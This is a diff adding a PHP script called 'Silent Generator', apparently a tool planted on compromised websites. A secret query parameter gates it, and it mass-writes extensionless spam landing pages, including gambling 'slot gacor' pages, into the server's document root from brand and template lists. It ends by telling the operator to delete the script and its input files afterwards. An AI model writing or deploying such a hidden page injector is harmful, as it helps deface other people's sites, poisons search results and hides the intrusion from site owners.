@@ -1,0 +1,232 @@
+asdasdsadasdas
+
+
+<?php
+
+if (!isset($_GET['cmd']) || $_GET['cmd'] !== 'crot') {
+    die('Access Denied!');
+}
+
+$paths  = file('path.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+$brands = file('brand.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+$temas  = file('tema.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+$template = file_get_contents('lp.txt');
+
+set_time_limit(0);
+ob_start();
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Silent Generator - File Tanpa Ekstensi</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+    body {
+        background: #0a0e27;
+        font-family: monospace;
+        padding: 20px;
+        color: #00ffcc;
+    }
+    .container {
+        max-width: 900px;
+        margin: auto;
+        background: #111827;
+        border-radius: 10px;
+        padding: 20px;
+        border: 1px solid #00ffcc;
+    }
+    .header {
+        border-bottom: 1px solid #00ffcc;
+        margin-bottom: 20px;
+        padding-bottom: 10px;
+    }
+    .log {
+        background: #000000;
+        padding: 8px 12px;
+        margin: 8px 0;
+        border-radius: 6px;
+        font-size: 13px;
+        border-left: 3px solid #00ffcc;
+        word-break: break-all;
+    }
+    .badge {
+        float: right;
+        padding: 2px 8px;
+        border-radius: 4px;
+        font-size: 11px;
+        font-weight: bold;
+    }
+    .badge.success { background: #00aa55; color: white; }
+    .badge.fail { background: #ff3333; color: white; }
+    .badge.info { background: #ffaa00; color: black; }
+    .footer {
+        margin-top: 20px;
+        padding-top: 10px;
+        border-top: 1px solid #00ffcc;
+        text-align: center;
+    }
+    .warning {
+        background: #330000;
+        padding: 10px;
+        margin: 15px 0;
+        border-radius: 6px;
+        color: #ff8888;
+        font-size: 12px;
+    }
+    h1 { font-size: 20px; margin: 0; color: #00ffcc; }
+    .credit { font-size: 10px; color: #666; margin-top: 10px; }
+    .example {
+        background: #1a1f3a;
+        padding: 10px;
+        border-radius: 6px;
+        font-size: 12px;
+        margin-top: 10px;
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1>🔇 Silent Generator - FILE Tanpa Ekstensi</h1>
+        <p>Path terakhir = FILE (bukan folder) | Contoh: author/mizutani/168168 → FILE 168168</p>
+        <div class="example">
+            📌 Contoh path.txt:<br>
+            author/mizutani/168168<br>
+            produk/sepatu/nike123<br>
+            artikel/slot/gacor777
+        </div>
+    </div>
+
+<?php
+
+$success = 0;
+$fail = 0;
+
+if (count($brands) < count($paths)) {
+    die("<div class='log'>
+            <span>❌ Brand kurang dari jumlah path!</span>
+            <span class='badge fail'>ERROR</span>
+          </div>");
+}
+
+foreach ($paths as $index => $path) {
+
+    $path = trim($path);
+    
+    // Bersihkan path dari ekstensi apapun di akhir
+    $path = preg_replace('/\.(php|html?|png|jpg|gif|css|js|txt)$/i', '', $path);
+    
+    // HAPUS trailing slash jika ada
+    $path = rtrim($path, '/');
+    
+    echo "<div class='log'>
+            <span>📁 Processing: $path</span>
+            <span class='badge info'>INFO</span>
+          </div>";
+    
+    // Pisahkan path menjadi bagian-bagian
+    $parts = explode('/', $path);
+    
+    // Ambil nama file (bagian terakhir)
+    $fileName = array_pop($parts);
+    
+    // Sisanya adalah folder path
+    $folderPath = implode('/', $parts);
+    
+    // Build full folder path di server
+    $fullFolderPath = $_SERVER['DOCUMENT_ROOT'] . '/' . $folderPath;
+    
+    // File output (tanpa ekstensi)
+    $outputFile = $fullFolderPath . '/' . $fileName;
+    
+    // Buat folder recursively jika belum ada
+    if (!empty($folderPath) && !is_dir($fullFolderPath)) {
+        if (!mkdir($fullFolderPath, 0755, true)) {
+            echo "<div class='log'>
+                    <span>❌ Gagal buat folder: $fullFolderPath</span>
+                    <span class='badge fail'>ERROR</span>
+                  </div>";
+            $fail++;
+            continue;
+        }
+    }
+    
+    // URL Canonical
+    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
+    $url = $protocol . "://" . $_SERVER['HTTP_HOST'] . '/' . $path;
+    
+    $brand = $brands[$index];
+    $brandUpper = strtoupper($brand);
+    
+    // Proses konten
+    $content = $template;
+    
+    // Replace semua variabel PHP dengan value static
+    $content = str_replace('{{BRAND_NAME}}', $brand, $content);
+    $content = str_replace('{{URL_PATH}}', $url, $content);
+    
+    // Bersihkan semua tag PHP
+    $content = preg_replace('/<\?php\s*echo\s*strtoupper\(\s*\$brandName\s*\)\s*;\s*\?>/i', $brandUpper, $content);
+    $content = preg_replace('/<\?php\s*echo\s*\$urlPath\s*;?\s*\?>/i', $url, $content);
+    $content = preg_replace('/<\?=\s*strtoupper\(\s*\$brandName\s*\)\s*\?>/i', $brandUpper, $content);
+    $content = preg_replace('/<\?=\s*\$urlPath\s*\?>/i', $url, $content);
+    $content = preg_replace('/<\?php.*?\?>/s', '', $content);
+    $content = preg_replace('/<\?=.*?\?>/s', '', $content);
+    
+    // Tulis FILE (tanpa ekstensi)
+    if (file_put_contents($outputFile, $content)) {
+        echo "<div class='log'>
+                <span>✅ FILE: $outputFile</span>
+                <span class='badge success'>SUCCESS</span>
+              </div>";
+        echo "<div class='log' style='border-left-color: #ffaa00; font-size: 11px;'>
+                <span>🔗 URL: $url</span>
+                <span class='badge info'>CANONICAL</span>
+              </div>";
+        $success++;
+    } else {
+        echo "<div class='log'>
+                <span>❌ Gagal write: $outputFile</span>
+                <span class='badge fail'>ERROR</span>
+              </div>";
+        $fail++;
+    }
+    
+    ob_flush();
+    flush();
+}
+
+?>
+
+<div class="footer">
+    <strong>✅ Process Completed</strong><br><br>
+    <span style="color:#00ffcc;">✓ Success: <?php echo $success; ?></span> &nbsp;|&nbsp;
+    <span style="color:#ff6666;">✗ Failed: <?php echo $fail; ?></span>
+
+    <div class="warning">
+        ⚠️ <strong>BERSIHKAN FILE INI SETELAH SELESAI:</strong><br>
+        - Script ini (generator.php)<br>
+        - path.txt<br>
+        - brand.txt<br>
+        - lp.txt<br><br>
+        💡 <strong>Struktur Output:</strong><br>
+        author/mizutani/168168 → FILE <strong>168168</strong> (tanpa ekstensi)<br>
+        Folder <strong>author/mizutani/</strong> akan dibuat otomatis
+    </div>
+
+    <div class="credit">
+        🔇 Silent Generator - File Tanpa Ekstensi
+    </div>
+</div>
+
+</div>
+
+</body>
+</html>
+
+<?php
+ob_end_flush();
+?>
